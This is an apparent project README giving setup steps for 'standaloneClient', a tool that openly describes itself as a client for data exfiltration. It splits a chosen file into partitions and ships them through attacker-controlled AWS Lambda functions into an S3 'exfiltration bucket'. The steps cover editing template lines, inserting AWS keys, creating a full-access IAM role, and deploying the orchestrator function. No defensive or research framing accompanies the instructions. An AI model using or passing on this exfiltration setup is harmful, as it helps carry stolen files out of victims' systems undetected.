# standaloneClient
## Usage
`py clientName.py "Path_to_file"`
## Setup

Here we will discuss how to set up a working client for data exfiltration.

###### Note 1: Use python 3.x
###### Note 2: Be careful when using AWS Regions, specially when creating lambda functions and S3 buckets.
###### Note 3: Try to follow the steps in order

##### Client Setup
Open `standaloneClient_template.py` and modify the following lines with desired values.

*Line 11*  Modify partition size
`partitionSize = 100 #Change for desired partition size`
*Line 42*  Modify Orchestrator function name (Rem)
`orq_response = self.aws_lambda.invoke(FunctionName = '<ORCHESTRATOR_FUNCTION_NAME>', Payload = orqPayload_json)`
*Line 85* Modify with AWS Keys
`client.awsConnect('<ACCESS_KEY_ID>','<SECRET_ACCESS_KEY_ID>','<REGION>')`

##### IAM Console
Go to AWS IAM console and create a role (Remember the ARN name) with the following permissions:

- AWSLambdaFullAccess
- AmazonS3FullAccess
- CloudWatchFullAccess

##### S3 Console
We will now create 2 buckets.
The **exfiltration bucket** in which we will save out exfiltrated files (their partitions).
The **template bucket** in which we will save the template used for creating the lambda functions required.
(If the above sounds like gibberish, refer to the explanation on how the exfiltration works)

Create 2 buckets with default config and remember their names. One will be used for exfiltration and the other one for our templates.

##### Sample Function Setup
Open `sampleFunction_template.py`.
*Line 6*  Modify with the exfiltration bucket name
`bucket_name = "<EXFILTRATION_BUCKET_NAME>"`

Compress the function and upload it to the template bucket created before. Remember the compressed function name. We should now have a sampleFunction_template.zip inside our template bucket.

##### Lambda console setup
Create a lambda function called `<Insert orchestrator name>`.
Give the function the role previously created. This can be done by scrolling down a bit one the function is created.

Copy and paste the contents of `orchestrator_template.py` into the newly created lambda function.

*Line 26*  Modify IAM Role ARN
`Role = '<LAMBDA_S3_IAM_ROLE>'`
*Line 29*  Modify Template Bucket Name
`'S3Bucket': '<TEMPLATES_BUCKET>'`
*Line 30* Modify Compressed function name
`'S3Key': '<COMPRESSED_FUNCTION_NAME>'`

Increase the timeout of this function to 1 minute and memory to 512MB
